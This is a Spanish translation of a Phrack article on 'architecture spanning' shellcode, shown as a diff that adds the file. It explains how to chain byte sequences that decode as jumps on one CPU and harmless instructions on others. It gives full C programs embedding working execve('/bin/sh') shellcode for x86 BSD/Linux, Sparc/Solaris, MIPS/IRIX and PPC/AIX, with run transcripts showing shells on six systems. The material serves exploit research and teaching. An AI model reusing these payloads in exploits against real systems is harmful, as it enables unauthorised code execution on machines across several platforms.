@@ -1,0 +1,703 @@
+                             ==Phrack Inc.==
+
+             Volumen 0x0b, Numero 0x39, Archivo #0x0e de 0x12
+
+|=-------------=[ Shellcode Abarcador de Arquitectura ]=-----------------=|
+|=-----------------------------------------------------------------------=|
+|=---------------------=[ eugene@gravitino.net ]=------------------------=|
+
+
+
+Introduccion
+------------
+
+  En la fiesta del desafio caezar4 [1] de la defcon8 un problema fue presentar
+para escribir un shellcode que pudiera correr en dos o mas plataformas
+de procesador. A continuacion encontraras mi solucion (no olvides chequear
+la seccion de creditos).
+
+  La idea general detras de un shellcode abarcador de arquitectura es
+tratar de encontrar una secuencia de bytes que pueda ejecutar una instruccion
+jump en una arquitectura mientras se ejecuta una instruccion de tipo nop en
+otra arquitectura. De ese modo podemos bifurcarnos a otro codigo especifico
+de arquitectura dependiendo en la plataforma en la que nuestro codigo
+esta corriendo.
+
+  Aqui hay una representacion ASCII de nuestro byte stream:
+
+XXX
+arch1 shellcode
+arch2 shellcode
+
+donde XXX es una secuencia de bytes que va a bifurcar al shellcode de arch2
+en la arquitectura 2 y va a caer a traves del shellcode de arch1 en la
+arquitectura 1.
+
+  Si queremos agregar mas plataformas podemos necesitar agregar instrucciones
+jump/nop adicionales para cada plataforma adicional.
+
+
+
+Arquitectura MIPS
+------------------
+
+  Una breve introduccion a la arquitectura MIPS y escribir shellcode MIPS
+fue descripto por scut en phrack 56 [2] asi como tambien por la gente de LSD
+en su paper [8].
+
+  La unica cosa que es peor repetir aqui es el formato general de instruccion
+de MIPS. Todas las instrucciones MIPS ocupan 32 bits y los sextos bits mas
+significantes especifican el opcode de instruccion [6][7]. Hay 3 formatos
+de instruccion: I-Type (inmediato), J-Type (Jump) y R-Type (Registro).
+Ya que estamos buscando instrucciones de tipo nop estamos mas interesados en
+tipos de instrucciones I y R cuyo formato esta listado a continuacion.
+
+
+Formato de instruccion I-Type:
+
+31 30 29 28 27 26|25 24 23 22 21| 20 19 18 17 16| 15 .. 0
+        op       |       rs     |        rt     | immediate
+
+campos:
+        op            codigo de operacion de 6-bit
+        rs            especificador de registro fuente de 5-bit
+        rt            objetivo de 5-bit (src/dest) o condicion de ramificacion
+        immediate     16-bit immediate, branch o desplazamiento de direccion
+
+
+
+Formato de instruccion R-Type:
+
+31 30 29 28 27 26|25 24 23 22 21| 20 19 18 17 16| 15 14 131211|109876|5..0
+        op       |       rs     |        rt     |      rd     | shamt|funct
+
+campos:
+        op              codigo de operacion de 6-bit
+        rs              especificador de registro fuente de 5-bit
+        rt              objetivo de 5-bit (src/dest) o condicion de ramas
+        rd              especificador de registro de destino de 5-bit
+        shamt           cantidad de cambio de 5-bit
+        funct           campo de funcion de 6-bit
+
+
+
+Arquitectura Sparc
+------------------
+
+  Similarmente a MIPS, Sparc es una arquitectura basada en RISC. Todas las
+instrucciones de Sparc ocupan 32 bits y los dos bits mas significantes
+especifican una clase de instruccion [4]:
+
+
+op      Clase de Instruccion
+
+00      Instrucciones de Ramificacion
+01      Instruccion call
+10      Instrucciones Format Three (tipo 1)
+11      Instrucciones Format Three (tipo 2)
+
+
+  La instruccion call de formato uno contiene un campo op '01' seguido por
+30 bits de direccion. Incluso aunque esta es la instruccion optima para usar,
+ya que controlamos 30 bits de 32, no podremos usarla ya que los jumps no
+son relativos y tienden a tener 0 bytes en ellos.
+
+  Las instrucciones Format three (tipo 2) son mayormente instrucciones
+cargar/guardar que nos son mayormente utiles ya que solo estamos buscando
+instrucciones de tipo nop relativamente inofensivas. Definitivamente no
+queremos usar nada que tenga posibilidad de colgar nuestro programa
+(SIGSEV en caso de un cargar/guardar ilegal).
+
+  Esto nos deja con instrucciones rama (branch) y format three (tipo 1)
+para usar. Aqui esta el formato de una instruccion format three:
+
+
+31 30 |29 28 27 26 25|24 23 22 21 20 19|18 17 16 15 14|13|12 11 10 9 8 7..0
+  op  |       rd     |      op3        |       rs1    |01|    rs2 / imm
+
+campos:
+        op              clase de instruccion de 2-bit (10)
+        rd              especificador de registro destino de 5-bit
+        op3             especificador de instruccion de 5-bit
+        rs1             registro fuente de 5-bit
+        0/1             constante de 1-bit / opcion de segundo registro fuente
+        rs2 / imm       13-bit especifica o un segundo registro fuente o
+                               una constante
+
+  Algunas de las instrucciones (inofensivas) format three prometidas y
+buscadas son add, and, or, xor y sll/srl (especificada por bits op3).
+
+Y aqui esta el formato de instruccion rama:
+
+31 30 |29|28 27 26 25|24 23 22|21 .. 0
+  op  |a | condition |   op2  |displacement
+
+campos:
+        op              2-bit clase de instruccion (00)
+        a               1-bit flag anulada
+        condition       5-bit especificador de condicion.. ba, bn, bl, ble, be, etc
+        op2             3-bit codigo de condicion (el codigo de condicion
+                        integer es 010)
+        displacement    22-bit desplazamiento de direccion
+
+
+  Como puedes ver, muchos de estos campos ya tienen valores predefinidos
+sobre los que necesitamos trabajar alrededor.
+
+
+Arquitectura PPC
+----------------
+
+  PowerPC es todavia otra arquitectura RISC usada por vendedores tales como
+IBM y Apple. Lee el paper de LSD [8] para mas informacion.
+
+Arquitectura x86
+----------------
+
+  El topic de buffer overflows y shellcode en la arquitectura x86 ha sido
+llevado a la muerte antes. Para una buena introduccion lee el articulo de
+Aleph1 en phrack49 [3].
+
+  Para expandir solo un poco sobre el tema voy a presentar codigo x86 que
+funciona en multiples sistemas operativos x86. La idea detras de un
+shellcode "abarcando SOs" es configurar todos los registros y stack de tal
+forma que satisfaga los requerimientos de todos los sistemas operativos
+en los que nuestro shellcode se supone correra. Por ejemplo, BSD pasa sus
+parametros en la pila mientras Linux usa registros (para pasar argumentos
+a syscalls). Si configuramos ambos registros y stack entonces nuestro codigo
+puede correr en sistemas BSD y Linux x86. El unico problema con la escritura
+de shellcode para sistemas BSD & Linux son los numeros de syscall execve()
+diferentes que usan los dos sistemas.
+Linux usa el numero de syscall 0xb mientras BSD usa 0x3b. Para vencer este
+problema, necesitamos distinguir entre los dos sistemas en el tiempo de
+ejecucion.
+Hay muchas formas de hacer eso tales como chequear donde son mapeados varios
+segmentos, la forma en que son configurados los registros de segmento, etc.
+Yo elijo analizar los registros de segmento ya que este metodo parece
+bastante robusto. En sistemas Linux, por ejemplo, los registros de segmento
+fs y gs son puestos a 0 (en modo usuario) mientras en sistemas BSD son
+puestos a valores no cero (0x1f en OpenBSD, 0x2f en FreeBSD). Podemos
+explotar esta diferencia para distinguir entre los dos sistemas diferentes.
+Lee la seccion "Agregando mas arquitecturas" para un ejemplo funcionando.
+
+  Otra forma para manejar numeros diferentes de syscalls es ignorar una
+se~al "invalid system call" de SIGSYS y tan solo tratar un numero diferente
+de syscall si la primera llamada execve() fallo. Mientras ese metodo
+ciertamente funciona esta muy limitado y no puede ser aplicado a otros
+sistemas operativos tales como Solaris x86 que no usa la puerta trampa
+de interrupcion 0x80.
+
+  Nota que el shellcode "abarcando SOs" no esta ciertamente restringido a
+una plataforma x86, la misma idea puede ser aplicada a cualquier plataforma
+de hardware y cualquier sistema operativo.
+
+
+
+Poniendolo todo junto.. Shellcode abarcador de arquitectura
+-----------------------------------------------------------
+
+  Como ya mencione antes nuesto shellcode (primer intento) va a verse como
+
+XXX
+arch1 shellcode
+arch2 shellcode
+
+donde XXX es un string especialmente dise~ado que ejecuta diferentes
+instrucciones en dos plataformas diferentes.
+
+  Cuando inicialmente empece a buscar un string XXX funcionando, tome una
+instruccion short jump x86 y trate de decodificarlo en una sun box. Ya que
+el primer byte de una instruccion short jump x86 es 0xEB (que son casi todos
+unos) [5], la instruccion decodifico dentro de una instruccion sparc de
+format 3 extra~o.
+Mi siguiente intento consistio en escribir una instruccion jump de sparc
+y tratar de decodificarla en una plataforma x86. Esa idea casi funciono
+pero no pude decodificar la instruccion jump de sparc dentro de una
+instruccion xor de x86 del tipo nop debido a una diferencia de un bit de
+offset. El siguiente intento consistio en rellenar una instruccion jump x86.
+Ya que una instruccion short jump x86 es 2 bytes de larga y todas las
+instrucciones de sparc son de 4 bytes de largo, tuve 2 bytes con los que
+jugar. Sabia que tenia que insertar algunos bytes antes del byte 0xEB jump
+para poder decodificar la instruccion a algo razonable en sparc. Para mis
+bytes de relleno elegi usar los bytes nop 0x90 de x86 que fue
+una buena idea ya que 0x90 es mayormente todos ceros. Mi stream de
+instruccion entonces se vio como
+
+\x90\x90\xeb\x30
+
+donde 0x90 es la instruccion nop x86, 0xEB es el opcode para un short jump
+x86 y 0x30 es un offset jump de 48 bytes. Aqui esta a continuacion el
+string decodificado a una maquina Sun:
+
+(gdb) x 0x1054c
+0x1054c <main+20>:      0x9090eb30
+
+(gdb) x/t 0x1054c
+0x1054c <main+20>:      10010000100100001110101100110000
+
+(gdb) x/i 0x1054c
+0x1054c <main+20>:      orcc  %g3, 0xb30, %o0
+
+  Como puedes ver, nuestro string decodificado a una inofensiva instruccion
+'or' de format 3 corrompio el registro %o0. Esto es exactamente lo que
+estabamos buscando, un short jump en una arquitectura (x86) y una instruccion
+inofensiva en otra arquitectura (sparc). Con eso en mente nuesto shellcode
+se ve ahora asi:
+
+\x90\x90\xeb\x30
+[sparc shellcode]
+[x86 shellcode]
+
+
+Probemoslo..
+
+
+[openbsd]$ cat ass.c          ; ass como en Architecture Spanning Shellcode :)
+char sc[] =
+        /* string magico */
+	"\x90\x90\xeb\x30"
+
+        /* execve() de solaris de sparc */
+	"\x2d\x0b\xd8\x9a"                   /* sethi $0xbd89a, %l6        */
+	"\xac\x15\xa1\x6e"                   /* or %l6, 0x16e, %l6         */
+	"\x2f\x0b\xdc\xda"                   /* sethi $0xbdcda, %l7        */
+	"\x90\x0b\x80\x0e"                   /* and %sp, %sp, %o0          */
+	"\x92\x03\xa0\x08"                   /* add %sp, 8, %o1            */
+	"\x94\x1a\x80\x0a"                   /* xor %o2, %o2, %o2          */
+	"\x9c\x03\xa0\x10"                   /* add %sp, 0x10, %sp         */
+	"\xec\x3b\xbf\xf0"                   /* std %l6, [%sp - 0x10]      */
+	"\xdc\x23\xbf\xf8"                   /* st %sp, [%sp - 0x08]       */
+	"\xc0\x23\xbf\xfc"                   /* st %g0, [%sp - 0x04]       */
+	"\x82\x10\x20\x3b"                   /* mov $0x3b, %g1             */
+	"\x91\xd0\x20\x08"                   /* ta 8                       */
+
+        /* execve() de BSD */
+        "\xeb\x17"                      /* jmp */
+        "\x5e"                          /* pop  %esi */
+        "\x31\xc0"                      /* xor  %eax, %eax */
+        "\x50"                          /* push %eax */
+        "\x88\x46\x07"                  /* mov  %al,0x7(%esi) */
+        "\x89\x46\x0c"                  /* mov  %eax,0xc(%esi) */
+        "\x89\x76\x08"                  /* mov  %esi,0x8(%esi) */
+        "\x8d\x5e\x08"                  /* lea  0x8(%esi),%ebx */
+        "\x53"                          /* push %ebx */
+        "\x56"                          /* push %esi */
+        "\x50"                          /* push %eax */
+        "\xb0\x3b"                      /* mov  $0x3b, %al */
+        "\xcd\x80"                      /* int  $0x80 */
+        "\xe8\xe4\xff\xff\xff"          /* call */
+        "\x2f\x62\x69\x6e\x2f\x73\x68"; /* /bin/sh */
+
+
+int main(void)
+{
+        void (*f)(void) = (void (*)(void)) sc;
+
+        f();
+
+        return 0;
+}
+
+
+[openbsd]$ gcc ass.c
+[openbsd]$ ./a.out
+$ uname -ms
+OpenBSD i386
+
+[solaris]$ gcc ass.c
+[solaris]$ ./a.out
+$ uname -ms
+SunOS sun4u
+
+funciono!
+
+
+
+Agregando mas arquitecturas
+---------------------------
+
+  Teoricamente, el shellcode abarcador no esta vinculado a ningun sistema
+operativo especifico ni a ninguna arquitectura de hardware especifica.
+Asi puede ser posible escribir shellcode que corra en mas de dos
+arquitecturas. El formato para nuestro shellcode (segundo intento) que
+corre en 3 arquitecturas va a ser
+
+XXX
+YYY
+arch1 shellcode
+arch2 shellcode
+arch3 shellcode
+
+donde arch1 es MIPS, arch2 es Sparc y arch3 es x86.
+
+  Mi primer intento fue probar y reusar el string magico desde ass.c.
+Desafortunadamente, 0X9090eb30 no decodifico nada razonable en una
+plataforma IRIX y entonces me vi forzado a buscar en cualquier lado.
+Mi siguiente intento fue reemplazar los bytes 0x90 con algunos otros
+bytes del tipo nop buscando una secuencia que pueda funcionar en ambas
+plataformas Sparc & MIPS. Despues de una prueba un par de instrucciones nop
+x86 desde el toolkit ADMmutate de K2, tropece sobre una instruccion AAA cuyo
+opcode era 0x37. La instruccion AAA funciono de forma genial ya que el
+string 0x3737eb30 decodifico correctamente en las tres plataformas:
+
+x86:
+	aaa
+	aaa
+	jmp +120
+
+sparc:
+	sethi  %hi(0xdFADE000), %i3
+
+mips:
+	ori $s7,$t9,0xeb78
+
+
+con el string XXX fuera de camino, fui dejado con la parte YYY de las
+plataformas MIPS y Sparc. La primera instruccion trate de hacerla funcionar
+en ambas plataformas. La instruccion fue un short jump ba,a (0x30800012)
+anulado de Sparc que decodifico a
+
+andi $zero,$a0,0x12
+
+en una plataforma MIPS. No solo hizo la instruccion jump decodificada a una
+'andi' inofensiva en una plataforma MIPS, tampoco requirio una instruccion
+slot de retardo de ramificacion despues de el ya que el ba jump fue anulado
+[4].
+Entonces ahora nuestro shellcode se ve asi
+
+
+        "\x37\x37\xeb\x78"      /* x86:         aaa; aaa; jmp 116+4     */
+                                /* MIPS:        ori $s7,$t9,0xeb78      */
+                                /* Sparc:       sethi %hi(0xdfade000),%i3*/
+
+        "\x30\x80\x00\x12"      /* MIPS:        andi $zero,$a0,0x12     */
+                                /* Sparc:       ba,a +72                */
+
+	[shellcode real recortado]
+
+
+  Mientras estamos agregando mas arquitecturas a nuestro shellcode
+echemos un vistazo tambien a PPC/AIX. La primer cosa logica para hacer es
+tratar y decodificar los strings XXX e YYY existentes desde el shellcode
+anterior en la plataforma PPC:
+
+(gdb) x 0x10000364
+0x10000364 <main+36>:   0x3737eb78
+
+(gdb) x/i 0x10000364
+0x10000364 <main+36>:   addic.  r25,r23,-5256
+
+(gdb) x/x 0x10000368
+0x10000368 <main+40>:   0x30800012
+
+(gdb) x/i 0x10000368
+0x10000368 <main+40>:   addic   r4,r0,18
+
+este es nuestro dia de suerte o que? los strings XXX e YYY desde el combo
+MIPS/x86/Sparc anterior decodificaron correctamente a dos instrucciones add
+inofensivas. Todo lo que necesitamos hacer ahora es venir con otra
+instruccion que va a ejecutar un jump en una plataforma MIPS mientras
+se ejecuta un nop en PPC/AIX. Despues de buscar un poco la instruccion
+'bgtz' de MIPS tendio a decodificar en una instruccion multiple valida
+en AIX:
+
+
+[MIPS]
+(gdb) x 0x10001008
+0x10001008 <sc+8>:      0x1ee00101
+
+(gdb) x/i 0x10001008
+0x10001008 <sc+8>:      bgtz $s7,0x10001410 <+1040>
+
+
+[AIX]
+(gdb) x 0x10000378
+0x10000378 <main+56>:   0x1ee00101
+
+(gdb) x/i 0x10000378
+0x10000378 <main+56>:   mulli   r23,r0,257
+
+la instruccion bgtz es una rama sobre un mayor que cero [7]. Nota que la
+instruccion rama (branch) usa el registro $s7 que fue modificado por
+nosotros en una instruccion nop previa. El desplazamiento de la rama es
+puesto a 0x0101 (para evitar bytes NULOS en la instruccion) que es
+equivalente a un forward jump relativo de 1028 bytes. Pongamos ahora todo
+junto:
+
+
+
+[openbsd]$ cat ass.c
+
+/*
+ * Architecture/OS Spanning Shellcode
+ *
+ * corre en x86 (freebsd, netbsd, openbsd, linux), MIPS/Irix, Sparc/Solaris
+ * y PPC/AIX (las plataformas AIX requieren el flag -DAIX del compilador)
+ *
+ * eugene@gravitino.net
+ */
+
+char sc[] =
+	/* voodoo */
+	"\x37\x37\xeb\x7b"	/* x86:		aaa; aaa; jmp 116+4	*/
+				/* MIPS:	ori	$s7,$t9,0xeb7b	*/
+				/* Sparc:	sethi	%hi(0xdFADEc00), %i3 */
+				/* PPC/AIX:	addic.	r25,r23,-5253	*/
+
+	"\x30\x80\x01\x14"	/* MIPS:	andi	$zero,$a0,0x114	*/
+				/* Sparc: 	ba,a	+1104		*/
+				/* PPC/AIX:	addic   r4,r0,276	*/
+
+	"\x1e\xe0\x01\x01"	/* MIPS:	bgtz	$s7, +1032	*/
+				/* PPC/AIX:	mulli	r23,r0,257	*/
+
+	"\x30\x80\x01\x14"	/* llena el slot de retardo de 
+				   ramificacion de MIPS con el anterior 
+				   nop de MIPS / AIX	                */
+
+
+	/* PPC/AIX shellcode by LAST STAGE OF DELIRIUM	*://lsd-pl.net/	*/
+	"\x7e\x94\xa2\x79"	/* xor.		r20,r20,r20		*/
+	"\x40\x82\xff\xfd"	/* bnel		<syscallcode>		*/
+	"\x7e\xa8\x02\xa6"	/* mflr		r21			*/
+	"\x3a\xc0\x01\xff"	/* lil		r22,0x1ff		*/
+	"\x3a\xf6\xfe\x2d"	/* cal		r23,-467(r22)		*/
+	"\x7e\xb5\xba\x14"	/* cax		r21,r21,r23		*/
+	"\x7e\xa9\x03\xa6"	/* mtctr	r21			*/
+	"\x4e\x80\x04\x20"	/* bctr					*/
+
+	"\x04\x82\x53\x71"
+	"\x87\xa0\x89\xfc"
+	"\x69\x68\x67\x65"
+
+	"\x4c\xc6\x33\x42"	/* crorc	cr6,cr6,cr6		*/
+	"\x44\xff\xff\x02"	/* svca		0x0			*/
+	"\x3a\xb5\xff\xf8"	/* cal		r21,-8(r21)		*/
+
+	"\x7c\xa5\x2a\x79"	/* xor.		r5,r5,r5		*/
+	"\x40\x82\xff\xfd"	/* bnel		<shellcode>		*/
+	"\x7f\xe8\x02\xa6"	/* mflr		r31			*/
+	"\x3b\xff\x01\x20"	/* cal		r31,0x120(r31)		*/
+	"\x38\x7f\xff\x08"	/* cal		r3,-248(r31)		*/
+	"\x38\x9f\xff\x10"	/* cal		r4,-240(r31)		*/
+	"\x90\x7f\xff\x10"	/* st		r3,-240(r31)		*/
+	"\x90\xbf\xff\x14"	/* st		r5,-236(r31)		*/
+	"\x88\x55\xff\xf4"	/* lbz		r2,-12(r21)		*/
+	"\x98\xbf\xff\x0f"	/* stb		r5,-241(r31)		*/
+	"\x7e\xa9\x03\xa6"	/* mtctr	r21			*/
+	"\x4e\x80\x04\x20"	/* bctr					*/
+	"/bin/sh"
+
+
+	/* x86 BSD/Linux execve() por mi */
+        "\xeb\x29"		/* jmp					*/
+        "\x5e"			/* pop		%esi			*/
+        "\x31\xc0"		/* xor		%eax, %eax		*/
+        "\x50"			/* push		%eax 			*/
+        "\x88\x46\x07"		/* mov		%al,0x7(%esi) 		*/
+        "\x89\x46\x0c"		/* mov		%eax,0xc(%esi)		*/
+        "\x89\x76\x08"		/* mov		%esi,0x8(%esi)		*/
+        "\x8d\x5e\x08"		/* lea		0x8(%esi),%ebx		*/
+        "\x53"			/* push		%ebx			*/
+        "\x56"			/* push		%esi			*/
+        "\x50"			/* push		%eax			*/
+
+        /* configurar registros para linux */
+        "\x8d\x4e\x08"		/* lea		0x8(%esi),%ecx		*/
+        "\x8d\x56\x08"		/* lea		0x8(%esi),%edx		*/
+        "\x89\xf3"		/* mov		%esi, %ebx		*/
+
+        /* distinguir entre BSD & Linux */
+        "\x8c\xe0"		/* movl		%fs, %eax		*/
+        "\x21\xc0"		/* andl		%eax, %eax		*/
+        "\x74\x04"		/* jz		+4			*/
+        "\xb0\x3b"		/* mov		$0x3b, %al		*/
+        "\xeb\x02"		/* jmp		+2			*/
+        "\xb0\x0b"		/* mov		$0xb, %al		*/
+
+        "\xcd\x80"		/* int		$0x80			*/
+
+        "\xe8\xd2\xff\xff\xff"	/* call					*/
+        "\x2f\x62\x69\x6e"	/* /bin					*/
+	"\x2f\x73\x68"		/* /sh					*/
+
+
+	/*
+	 * rellenar los shellcodes de MIPS/Irix & Sparc/Solaris
+	 * jumps de > 0x0101 bytes son llevados a cabo en ambas 
+	 * plataformas para evitar bytes NULL en las instrucciones jump
+	 */
+	"2359595912811011811145128130124118116118121114127231291301241171"
+	"2911813245571341291181211101231241181291101234512913012411712911"
+	"8132455712712412112411245123118120128451291301241171291181324512"
+	"9128118133114451141004559113130110111451141171294511512445134129"
+	"1301101141112311411712945571171121291181321284511411712945113123"
+	"1104512312412712911211412111445114117129451151244511312112712413"
+	"2451141171294559595913212412345113121127124132451271301244512811"
+	"8451281181179797117118128451181284512413012745132124127121113451"
+	"2312413259595945129117114451321241271211134512411545129117114451"
+	"1412111411212912712412345110123113451291171144512813211812911211"
+	"7574512911711423111114110130129134451241154512911711445111110130"
+	"1135945100114451141331181281294513211812911712413012945128120118"
+	"1234511212412112412757451321181291171241301294512311012911812412"
+	"31101211181291345745132118"
+
+
+        /* 68 byte MIPS/Irix PIC execve shellcode. -scut/teso		*/
+        "\xaf\xa0\xff\xfc"      /* sw           $zero, -4($sp)          */
+        "\x24\x06\x73\x50"      /* li           $a2, 0x7350             */
+        "\x04\xd0\xff\xff"      /* bltzal       $a2, dpatch             */
+        "\x8f\xa6\xff\xfc"      /* lw           $a2, -4($sp)            */
+
+        /* a2 = (char **) envp = NULL */
+        "\x24\x0f\xff\xcb"      /* li           $t7, -53                */
+        "\x01\xe0\x78\x27"      /* nor          $t7, $t7, $zero         */
+        "\x03\xef\xf8\x21"      /* addu         $ra, $ra, $t7           */
+
+        /* a0 = (char *) pathname */
+        "\x23\xe4\xff\xf8"      /* addi         $a0, $ra, -8            */
+
+        /* arreglar el byte tonto 0x42 en la ruta al shell */
+        "\x8f\xed\xff\xfc"      /* lw           $t5, -4($ra)            */
+        "\x25\xad\xff\xbe"      /* addiu        $t5, $t5, -66           */
+        "\xaf\xed\xff\xfc"      /* sw           $t5, -4($ra)            */
+
+        /* a1 = (char **) argv */
+        "\xaf\xa4\xff\xf8"      /* sw           $a0, -8($sp)            */
+        "\x27\xa5\xff\xf8"      /* addiu        $a1, $sp, -8            */
+
+        "\x24\x02\x04\x23"      /* li           $v0, 1059 (SYS_execve)  */
+        "\x01\x01\x01\x0c"      /* syscall                              */
+        "\x2f\x62\x69\x6e"      /* .ascii       "/bin"                  */
+        "\x2f\x73\x68\x42"      /* .ascii       "/sh", .byte 0xdummy    */
+
+
+        /* Sparc Solaris execve() por un autor desconocido */
+        "\x2d\x0b\xd8\x9a"	/* sethi	$0xbd89a, %l6           */
+        "\xac\x15\xa1\x6e"	/* or		%l6, 0x16e, %l6         */
+        "\x2f\x0b\xdc\xda"	/* sethi	$0xbdcda, %l7           */
+        "\x90\x0b\x80\x0e"	/* and		%sp, %sp, %o0           */
+        "\x92\x03\xa0\x08"	/* add		%sp, 8, %o1             */
+        "\x94\x1a\x80\x0a"	/* xor		%o2, %o2, %o2           */
+        "\x9c\x03\xa0\x10"	/* add		%sp, 0x10, %sp          */
+        "\xec\x3b\xbf\xf0"	/* std		%l6, [%sp - 0x10]       */
+        "\xdc\x23\xbf\xf8"	/* st		%sp, [%sp - 0x08]       */
+        "\xc0\x23\xbf\xfc"	/* st		%g0, [%sp - 0x04]       */
+        "\x82\x10\x20\x3b"	/* mov		$0x3b, %g1              */
+        "\x91\xd0\x20\x08"	/* ta		8                       */
+;
+
+
+int main(void)
+{
+#if defined(AIX)
+	/* copyright LAST STAGE OF DELIRIUM feb 2001 poland */
+        int jump[2]={(int)sc,*((int*)&main+1)};
+
+        ((*(void (*)())jump)());
+#else
+        void (*f)(void) = (void (*)(void)) sc;
+
+        f();
+#endif
+
+        return 0;
+}
+
+
+[openbsd]$ gcc ass.c
+[openbsd]$ ./a.out
+$ uname -ms
+OpenBSD i386
+
+[freebsd]$ gcc ass.c
+[freebsd]$ ./a.out
+$ uname -ms
+FreeBSD i386
+
+[linux]$ gcc ass.c
+[linux]$ ./a.out
+$ uname -ms
+Linux i686
+
+[solaris]$ gcc ass.c
+[solaris]$ ./a.out
+$ uname -ms
+SunOS sun4u
+
+[irix]$ gcc ass.c
+[irix]$ ./a.out
+$ uname -ms
+IRIX IP22
+
+[aix]$ gcc ass.c
+[aix]$ ./a.out
+$ uname -ms
+AIX 000089101000
+
+
+
+Conclusion
+-----------
+
+  Architecture spanning shellcode es un codigo especialmente dise~ado que
+se ejecuta de forma diferente dependiendo de la arquitectura en la que
+esta corriendo. El codigo alcanza eso usando una serie de bytes que se
+ejecutan de forma diferente en diferentes arquitecturas.
+
+  OS spanning shellcode es codigo especialmente dise~ado que se ejecuta en
+multiples sistemas operativos todos corriendo en la misma plataforma.
+El codigo alcanza eso configurando los registros y el stack en una forma que
+satisface los sistemas operativos en los que el codigo esta corriendo.
+
+
+
+Creditos / Gracias
+------------------
+
+Greg Hoglund    trabajando conmigo en esta idea en la fiesta del desafio
+
+prole and harm  por venir con la forma de la idea antes del desafio
+		http://www.redgeek.net/~prole/ASSC.txt
+
+gravitino.net, GHI, skyper, spoonm
+
+
+
+Referencias
+-----------
+
+[1] Caezar's challenge
+    http://www.caezarschallenge.org
+
+[2] Writing MIPS/IRIX shellcode
+    scut (phrack 56)
+
+[3] Smashing The Stack For Fun And Profit
+    Aleph One (phrack 49)
+
+[4] SPARC Architecture, Assembly Language Programming, and C. 2nd ed.
+    Richard P. Paul
+
+[5] IA-32 Intel Architecture, Software Developer's Manual
+    Intel, Corp
+    http://developer.intel.com
+
+[6] Computer Organization and Design
+    David A. Patterson and John L. Hennessy
+
+[7] MIPS RISC Architecture
+    Gerry Kane and Joe Heinrich
+
+[8] UNIX Assembly Codes Development for Vulnerabilities Illustration
+    Purposes
+    The Last Stage of Delirium Research Group http://lsd-pl.net
+
+|=[ EOF ]=---------------------------------------------------------------=|
+
+ Traducido por Active Matrix - ActiveMatrix@technologist.com
+ Para RareGaZz - http://raregazz.cjb.net
+ Argentina, 2002
+ El articulo aqui traducido, mantiene los derechos de autor.
+
+
